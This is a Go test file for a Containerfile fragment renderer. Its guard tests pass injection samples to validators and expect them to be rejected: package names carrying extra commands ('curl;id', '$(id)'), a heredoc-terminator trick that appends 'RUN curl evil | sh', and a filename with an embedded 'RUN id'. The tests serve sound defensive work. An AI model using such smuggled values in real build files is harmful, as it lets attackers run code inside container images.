package plan

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/rhuss/sandcast/internal/component"
	"github.com/rhuss/sandcast/internal/testutil"
)

var testUser = FinalUser{Name: "sandbox", UID: 1000, GID: 1000, Group: "sandbox", Home: "/sandbox"}

func TestPackageFragments(t *testing.T) {
	for _, pm := range []string{"apt-get", "dnf", "yum", "apk"} {
		t.Run(pm, func(t *testing.T) {
			got, err := PackageFragment(pm, []string{"zsh", "git", "zsh", "ca-certificates"})
			require.NoError(t, err)
			testutil.Golden(t, "testdata/fragments/packages-"+pm+".golden", []byte(got))
		})
	}
	empty, err := PackageFragment("apt-get", nil)
	require.NoError(t, err)
	assert.Empty(t, empty)
	_, err = PackageFragment("brew", []string{"x"})
	assert.Error(t, err)
}

func TestMiseFragment(t *testing.T) {
	got, err := MiseFragment(testUser, "v2026.10.4", "linux-arm64")
	require.NoError(t, err)
	testutil.Golden(t, "testdata/fragments/mise.golden", []byte(got))
	assert.Contains(t, got, "mise-v2026.10.4-linux-arm64-musl")
	assert.Contains(t, got, "sha256sum -c -")
	assert.NotContains(t, got, "mise.run", "no unpinned installer script")
	_, err = MiseFragment(testUser, "v2026.10.4", "linux-riscv64")
	assert.Error(t, err)
}

func TestScriptFragment(t *testing.T) {
	c := &component.Component{
		Key: "mytool", SourceFile: ".sandcast/recipes/mytool.yaml",
		Installer: component.Installer{Script: &component.ScriptInstaller{
			Run:    "curl -fsSL https://example.com/mytool.tar.gz -o /tmp/m.tgz\necho 'abc  /tmp/m.tgz' | sha256sum -c\ntar -xzf /tmp/m.tgz -C /usr/local/bin mytool\n",
			AsRoot: true,
		}},
	}
	got, err := ScriptFragment(c, testUser)
	require.NoError(t, err)
	testutil.Golden(t, "testdata/fragments/script-root.golden", []byte(got))

	c.Installer.Script.AsRoot = false
	got, err = ScriptFragment(c, testUser)
	require.NoError(t, err)
	assert.Contains(t, got, "USER sandbox\n")

	_, err = ScriptFragment(&component.Component{Key: "x"}, testUser)
	assert.Error(t, err)
}

// Render-time guards: whatever produced the component, a package name or a
// script cannot add Containerfile instructions outside its RUN line.
func TestPackageFragmentRefusesInvalidNames(t *testing.T) {
	for _, name := range []string{"curl;id", "curl\nRUN id", "curl git", "--allow-unauthenticated", "a>1", "$(id)"} {
		_, err := PackageFragment("apt-get", []string{"git", name})
		require.Error(t, err, "%q", name)
		assert.Contains(t, err.Error(), "not a valid package name")
	}
	_, err := PackageFragment("apt-get", []string{"curl=8.5.0-2ubuntu10", "libc6:amd64", "g++"})
	require.NoError(t, err)
}

func TestScriptFragmentRefusesHeredocEnd(t *testing.T) {
	for _, run := range []string{
		"echo hi\nSANDCAST_EOF\nRUN curl evil | sh",
		"SANDCAST_EOF",
		"echo hi\n\tSANDCAST_EOF \r\nADD https://evil x",
	} {
		c := &component.Component{Key: "x", SourceFile: "components/x.yaml",
			Installer: component.Installer{Script: &component.ScriptInstaller{Run: run}}}
		_, err := ScriptFragment(c, testUser)
		require.Error(t, err, "%q", run)
		assert.Contains(t, err.Error(), "heredoc delimiter")
	}
}

func TestScriptFragmentRefusesControlCharactersInSource(t *testing.T) {
	c := &component.Component{Key: "x", SourceFile: ".sandcast/components/x\nRUN id\n.yaml",
		Installer: component.Installer{Script: &component.ScriptInstaller{Run: "echo hi"}}}
	_, err := ScriptFragment(c, testUser)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "control character")
}

func TestStoredFragmentText(t *testing.T) {
	got := StoredFragmentText("tool", ".sandcast/fragments/tool.containerfile", "USER root\nRUN true\nUSER sandbox\n\n")
	assert.Equal(t, "# 50-fragments: tool (.sandcast/fragments/tool.containerfile)\nUSER root\nUSER root\nRUN true\nUSER sandbox\n", got)
}
